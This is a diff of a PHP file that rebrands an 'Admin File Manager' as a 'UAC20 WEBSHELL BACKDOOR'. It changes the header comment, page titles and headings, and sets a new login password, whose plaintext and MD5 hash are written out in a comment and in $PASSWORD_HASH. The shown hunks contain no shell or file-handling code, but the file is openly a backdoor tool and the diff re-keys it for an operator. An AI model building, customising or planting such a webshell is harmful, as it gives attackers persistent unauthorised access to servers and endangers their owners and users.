@@ -2,15 +2,11 @@
 
 /*
 |--------------------------------------------------------------------------
-| TOMCAT26x Admin File Manager
+| UAC20 WEBSHELL BACKDOOR
 |--------------------------------------------------------------------------
 | Features:
 | - Login Protection
 | - MD5 Password Authentication
-| - Responsive UI
-| - Black / Red / White Theme
-| - Font Awesome Icons
-| - File Manager
 |--------------------------------------------------------------------------
 */
 
@@ -24,12 +20,12 @@ ini_set('display_errors', 1);
 | LOGIN CONFIG
 |--------------------------------------------------------------------------
 |
-| Password: TOMCAT26x
-| MD5: 2db4f7d9b5d9d869eb8f95b8e50e65e9
+| Password: INJ3CT10N BY UAC20
+| MD5: 406b0a1f42731ae78b67d7c16e2efd50
 |
 */
 
-$PASSWORD_HASH = "9e9775baf241e6e37c75eeaa02002271";
+$PASSWORD_HASH = "406b0a1f42731ae78b67d7c16e2efd50";
 
 /*
 |--------------------------------------------------------------------------
@@ -193,7 +189,7 @@ button:hover{
 
         <h1>UAC Webshell</h1>
 
-        <p>Admin File Manager</p>
+        <p>Panel Manager</p>
 
     </div>
 
@@ -390,7 +386,7 @@ $items = scandir($currentPath);
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>TOMCAT26x Admin</title>
+<title>UAC20 WEBSHELL</title>
 
 <link rel="stylesheet"
 href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
@@ -670,7 +666,7 @@ tr:hover{
 
             <i class="fa-solid fa-shield-halved"></i>
 
-            <h1>TOMCAT26x</h1>
+            <h1>UAC20 PHP</h1>
 
         </div>
 
